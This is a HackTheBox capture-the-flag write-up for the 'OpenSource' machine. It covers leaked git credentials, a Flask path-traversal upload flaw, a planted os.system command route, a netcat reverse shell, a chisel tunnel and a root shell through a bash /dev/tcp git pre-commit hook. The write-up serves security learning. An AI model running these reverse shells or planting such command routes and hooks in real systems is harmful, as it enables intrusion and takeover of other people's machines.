---
description: HackTheBox OpenSource writeup
cover: ../.gitbook/assets/image (2) (1).png
coverY: 0
---

# \[Easy] OpenSource

<figure><img src="../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Machine Info <a href="#machine-info" id="machine-info"></a>

OpenSource starts from web-app which offers a zip file of source code that includes a Git repository. This leads to credentials leaks. The site also has a directory traversal flaw that allows us to read and write files. So, we’ll overwrite Flask views.py module and get RCE. From there, we will access a private Gitea instance and find an SSH key to gain shell access to the host. With a root-level cron job running Git commands, we can abuse git hooks to gain root access.

### Recon <a href="#recon" id="recon"></a>

`nmap` find only two open ports and one filtered port:

```bash
> nmap -sC -sV source.htb

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
```

### HTTP(80): <a href="#http80" id="http80"></a>

Here is a web page describing an open source web file sharing program that allows us to download the source code.

<figure><img src="http://localhost:1313/opensource/media2.png" alt=""><figcaption></figcaption></figure>

Further on the home page, you can try out this application.

After uploading the file, we are provided with a download link for the file we just uploaded.

<figure><img src="http://localhost:1313/opensource/media3.png" alt=""><figcaption></figcaption></figure>

![Desktop View](http://localhost:1313/opensource/media4.png)

Let’s take a look at the source code, if we can find anything that catches our eye.

The first thing to look at is the existence of a .git directory, first you need to check if there is any useful information in the git history.

```gitignore
> git branch 
> git log 
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:  Thu Apr 28 13:55:55 2022 +0200

  clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:  Thu Apr 28 13:45:17 2022 +0200
initial

> git checkout dev
Switched to branch 'dev'    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

> git diff c41fedef2ec6df98735c11b2faf1e79ef492a0f3 a76f8f75f7a4a12b706b0cf9c983796fa1985820

new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://<strong>dev01:Soulless_Developer#2022</strong>@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
```

We got the credentials which gonna be useful in future. Now, let’s check the source code of the web application and see if we can find possible security holes.

### Source Code Analyzing: <a href="#source-code-analyzing" id="source-code-analyzing"></a>

```python
@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = <strong>os.path.join</strong>(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(<strong>os.path.join</strong>(os.getcwd(), "public", "uploads", path))
```

What’s wrong with this code?

The problem is in `os.path.join` . Digging around a bit and looking at the documentation for `os.path.join`, we can see that if any of the parameters is an absolute path, all other parameters are discarded.

If we can set the path to absolute, we will have the ability to overwrite the `views.py` file.

Also, there is a `utils.py` module in which you can find the `get_unique_upload_name` function, aka WAF for files uploading, however, it only checks for possible LFI once, which allows us to change the filename to `..//app/app/file` , which will be changed to `/app/app/file` after WAF checks.

### Foothold <a href="#foothold" id="foothold"></a>

Let’s change **views.py** with the addition of an exec module:

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')



@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))


@app.route('/exec')
def cmd():
    return os.system(request.args.get('cmd'))
```

Then, we intercept the request through Burp Suite and upload the modified file:

We got the RCE, now we can deploy the reverse shell.

<figure><img src="http://localhost:1313/opensource/media5.png" alt=""><figcaption></figcaption></figure>

**Victim** :&#x20;

```url
http://source.htb/exec?cmd=nc%2010.10.16.2%20%201337%20-e%20/bin/sh
```

**Attacker:**&#x20;

```bash
nc -nlvp 1337PYTHT
```



### Container escape <a href="#container-escape" id="container-escape"></a>

<figure><img src="../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>

As you can see, we are in a docker container. However, now that we have access to the machine, we can check the previously found service on port 3000 and find out which service is running on it.

```bash
$ wget 10.10.11.164:3000
```

```bash
$ ls

INSTALL.md
app
index.html
public
run.py
```

```bash
$ cat index.html

<!DOCTYPE html>
<html lang="en-US" class="theme-">
<head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title> Gitea: Git with a cup of tea</title>
```

We see that the local `Gitea` service is running, but it’s available only from browser, so we can use `chisel` to make a port forwarding on our local machine.

**Victim:**

```bash
./chisel_1.7.7_linux_amd64 client 10.10.16.2:3000 R:5000:socks 
```

**Attacker:**&#x20;

```bash
./chisel_1.7.7_linux_amd64 server --port 3000 -v --reverse --socks5
```

After the connection is established, you must also set the proxy in the browser settings on the previously specified port (5000):

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

We got access to Gitea service, so now we can try that credentials from source code:

<figure><img src="../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

As you can see there is a private SSH-key `id_rsa`, that we can use to connect as user on machine:

```bash
➜ Downloads git:(public) ✗ ssh -i id_rsa dev01@source.htb
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)
Last login: Mon May 16 13:13:33 2022 from 10.10.14.23

dev01@opensource:~$ ls
user.txt
```

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Let’s use `pspy` to see what processes are running on a machine. After some time, I noticed the `/usr/local/bin/git-sync script` runs every few minute.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

![Desktop View](http://localhost:1313/opensource/media11.png)

I also noticed that the `git-commit` command making backups every minute, which makes me think about privilege escalation via `git-hooks` .

Since git-commit is done from the user’s directory, but as root, and dev01 can modify `/home/dev01/.git/hooks`, we can use it to elevate privileges.

Firstly, we need to change `/home/dev01/.git/hooks/pre-commit.sample` :

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.2/4242 0>&1
```

Then, remove the .sample extension and wait for the next backup:

```bash
➜ Downloads git:(public) ✗ nc -nlvp 4242
Connection from 10.10.11.164:51218
bash: cannot set terminal process group (2583): Inappropriate ioctl for device
bash: no job control in this shell
root@opensource:/home/dev01# ls /root/
ls /root/
config
meta
root.txt
```
